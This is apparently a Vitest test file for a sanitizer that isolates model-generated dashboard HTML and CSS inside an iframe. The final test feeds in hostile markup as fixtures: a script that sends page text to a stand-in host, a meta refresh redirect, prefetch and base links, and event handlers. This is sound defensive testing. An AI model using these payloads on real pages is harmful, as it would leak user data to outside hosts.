// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from 'vitest'
import { dashboardDocument } from '../pages/chat/command-center/dashboardDocument'

// jsdom parses CSS rules/declarations but lacks constructed-sheet replaceSync.
// This adapter accepts ONE top-level fixture rule, using its real CSSOM parser.
// It tests traversal, not browser parsing/security semantics (Playwright owns those).
const ParsedSheet = CSSStyleSheet
function constructedSheetFixture(prepare?: (sheet: CSSStyleSheet) => void) {
  const sheets: CSSStyleSheet[] = []
  vi.stubGlobal('CSSStyleSheet', class extends ParsedSheet {
    constructor() { super(); sheets.push(this) }
    replaceSync(css: string) {
      while (this.cssRules.length) this.deleteRule(0)
      if (css.trim()) this.insertRule(css, 0)
      prepare?.(this)
    }
  })
  return sheets
}

afterEach(() => { vi.unstubAllGlobals() })

describe('task dashboard document isolation', () => {
  it('removes generated-text declarations from parsed blocks and inline styles, retaining layout and literal data', () => {
    const sheets = constructedSheetFixture()
    const hostStyles = document.querySelectorAll('style').length
    const declarations = 'content:attr(title);list-style:square;list-style-type:circle;quotes:"a" "b";hyphenate-character:"hidden";display:grid;gap:12px'
    const html = `<style data-dashboard-field="css">.board{${declarations}}</style><p class="board" style='${declarations}' data-dashboard-field="result">Old</p>`
    const doc = new DOMParser().parseFromString(dashboardDocument(html, {}, 'dark', { result: '<b>&amp;</b>', css: 'body{display:none}' }), 'text/html')
    const block = (sheets[0].cssRules[0] as CSSStyleRule).style
    const inline = doc.querySelector('p')!.style
    for (const style of [block, inline]) {
      for (const name of ['content', 'list-style', 'list-style-type', 'quotes', 'hyphenate-character']) expect(style.getPropertyValue(name)).toBe('')
      expect(style.getPropertyValue('display')).toBe('grid')
      expect(style.getPropertyValue('gap')).toBe('12px')
    }
    expect(doc.querySelector('style[data-dashboard-field]')?.textContent).toContain('display: grid')
    expect(doc.querySelector('p')?.textContent).toBe('<b>&amp;</b>')
    expect(doc.querySelector('p b')).toBeNull()
    expect(doc.documentElement.textContent).not.toContain('body{display:none}')
    expect(document.querySelectorAll('style')).toHaveLength(hostStyles)
    expect(sheets.every(sheet => sheet.ownerNode == null)).toBe(true)
  })

  it('recurses through parsed media and keyframes, preserving safe responsive and animation declarations', () => {
    constructedSheetFixture()
    const html = '<style>@media (min-width:1px){.board{display:flex;content:"hidden"}}</style><style>@keyframes pulse{from{opacity:0;quotes:"a" "b"}to{opacity:1;hyphenate-character:"hidden"}}</style><p>Visible</p>'
    const doc = new DOMParser().parseFromString(dashboardDocument(html, {}, 'light', {}), 'text/html')
    const css = Array.from(doc.querySelectorAll('style')).map(style => style.textContent).join('\n')
    expect(css).toContain('@media (min-width:1px)')
    expect(css).toContain('display: flex')
    expect(css).toContain('@keyframes pulse')
    expect(css).toContain('opacity: 0')
    expect(css).toContain('opacity: 1')
    expect(css).not.toMatch(/content:|quotes:|hyphenate-character:|hidden/)
    expect(doc.body.textContent).toBe('Visible')
  })

  it('drops uninspectable rule fixtures at the root and inside grouping rules without dropping safe siblings', () => {
    // Deliberately opaque CSSOM fixtures: no claim that jsdom parses @counter-style.
    const opaque = { cssText: '@counter-style private { symbols: "hidden"; }' } as CSSRule
    constructedSheetFixture(sheet => {
      const rule = sheet.cssRules[0]
      if (!rule) return
      if ('cssRules' in rule) (rule as CSSGroupingRule).cssRules[1] = opaque
      else sheet.cssRules[1] = opaque
    })
    const doc = new DOMParser().parseFromString(dashboardDocument('<style>.root{display:grid}</style><style>@media print{.child{color:red}}</style>', {}, 'light', {}), 'text/html')
    expect(doc.documentElement.textContent).toContain('display: grid')
    expect(doc.documentElement.textContent).toContain('color: red')
    expect(doc.documentElement.textContent).not.toMatch(/counter-style|hidden/)
  })

  it('deletes an uninspectable keyframe by key text, not a grouping-rule numeric index', () => {
    const deleteRule = vi.fn()
    constructedSheetFixture(sheet => {
      const group = sheet.cssRules[0] as CSSKeyframesRule
      // jsdom also lacks keyframe deleteRule; model its specified keyText API.
      group.cssRules[1] = { keyText: 'to', cssText: 'to {}' } as CSSKeyframeRule
      group.deleteRule = deleteRule.mockImplementation((key: string) => {
        expect(key).toBe('to')
        Array.prototype.splice.call(group.cssRules, 1, 1)
      })
    })
    const output = dashboardDocument('<style>@keyframes pulse{from{opacity:0;content:"hidden"}to{opacity:1}}</style>', {}, 'light', {})
    expect(deleteRule).toHaveBeenCalledExactlyOnceWith('to')
    expect(output).toContain('opacity: 0')
    expect(output).not.toMatch(/hidden|to \{/)
  })

  it.each(['parse', 'inspect', 'serialize'])('fails closed on %s faults without losing the card text', fault => {
    constructedSheetFixture(sheet => {
      if (fault === 'parse') throw new Error('Unavailable isolated parser')
      const rule = sheet.cssRules[0]
      if (!rule) return
      if (fault === 'inspect') Object.defineProperty(rule, 'style', { get() { throw new Error('Unreadable declaration') } })
      // Fault injection at the serialization seam, not simulated escape parsing.
      else Object.defineProperty(rule, 'cssText', { value: '.x{font-family:"</StYle><p>escape</p>"}' })
    })
    const doc = new DOMParser().parseFromString(dashboardDocument('<style>.x{display:grid}</style><p style="display:flex">Visible</p>', {}, 'light', {}), 'text/html')
    expect(doc.querySelectorAll('style')).toHaveLength(1) // host theme only
    expect(doc.body.textContent).toBe('Visible')
    expect(doc.querySelector('p')?.hasAttribute('style')).toBe(fault !== 'parse')
    expect(doc.querySelectorAll('p')).toHaveLength(1)
    expect(doc.head.firstElementChild?.getAttribute('content')).toContain("default-src 'none'")
  })

  it('never invokes the constructed-sheet adapter for saved views', () => {
    const sheets = constructedSheetFixture(() => { throw new Error('Must not parse saved CSS') })
    const html = '<style>q{quotes:"a" "b"}</style><q style="hyphenate-character:inherit">Saved</q>'
    const output = dashboardDocument(html, {}, 'light')
    expect(sheets).toHaveLength(0)
    expect(output).toContain('q{quotes:"a" "b"}')
    expect(output).toContain('hyphenate-character:inherit')
  })

  it('drops automatic-card model styles when detached CSSOM parsing is unavailable', () => {
    const html = '<style>body::before{content:"hidden"}</style><p style="content:attr(title);display:grid" title="hidden">Visible</p>'
    vi.stubGlobal('CSSStyleSheet', undefined)
    try {
      const doc = new DOMParser().parseFromString(dashboardDocument(html, {}, 'light', {}), 'text/html')
      expect(doc.querySelectorAll('style')).toHaveLength(1) // host theme only
      expect(doc.querySelector('p')?.hasAttribute('style')).toBe(false)
      expect(doc.body.textContent).toBe('Visible')
      expect(dashboardDocument(html, {}, 'light')).toContain('body::before')
    } finally { vi.unstubAllGlobals() }
  })

  it('preserves free HTML/CSS/SVG layouts and native disclosure controls', () => {
    const html = dashboardDocument('<style>.board{display:grid}</style><article class="board"><h1>Release map</h1><details><summary>Evidence</summary>Verified</details><svg><path d="M0 0L10 10" /></svg><a href="#evidence">Jump</a></article>', { '--bg': '#111' }, 'dark')
    const doc = new DOMParser().parseFromString(html, 'text/html')
    expect(doc.querySelector('article h1')?.textContent).toBe('Release map')
    expect(doc.querySelector('details summary')?.textContent).toBe('Evidence')
    expect(doc.querySelector('svg path')).not.toBeNull()
    expect(doc.querySelector('a')?.getAttribute('href')).toBe('#evidence')
    expect(html).toContain('.board{display:grid}')
    expect(html).toContain('--bg:#111')
    expect(doc.head.firstElementChild?.getAttribute('content')).toContain("script-src 'none'")
  })

  it('removes executable, speculative and navigable model content before it reaches an iframe', () => {
    const html = dashboardDocument(`<meta http-equiv="refresh" content="0;url=https://outside.invalid/private">
      <link rel="dns-prefetch" href="https://private.outside.invalid"><base href="https://outside.invalid/">
      <script>location.href='https://outside.invalid/'+document.body.innerText</script>
      <iframe srcdoc="private"></iframe><object data="https://outside.invalid"></object>
      <template><script>bad()</script></template><noscript><img src="https://outside.invalid"></noscript>
      <p onclick="bad()">Private task</p><a href="https://outside.invalid/private">Open</a>
      <svg><a xlink:href="https://outside.invalid/private"><text>Label</text></a><set attributeName="href" to="https://outside.invalid" /></svg>`, {}, 'light')
    const doc = new DOMParser().parseFromString(html, 'text/html')
    expect(doc.querySelectorAll('script,link,base,iframe,object,template,noscript,set,[onclick]')).toHaveLength(0)
    expect(Array.from(doc.querySelectorAll('*')).flatMap(el => Array.from(el.attributes).filter(attr => attr.localName === 'href'))).toHaveLength(0)
    expect(doc.querySelectorAll('meta')).toHaveLength(1)
    expect(doc.head.firstElementChild?.getAttribute('content')).toContain("default-src 'none'")
    expect(doc.body.textContent).toContain('Private task')
    expect(html).not.toContain('outside.invalid')
  })
})
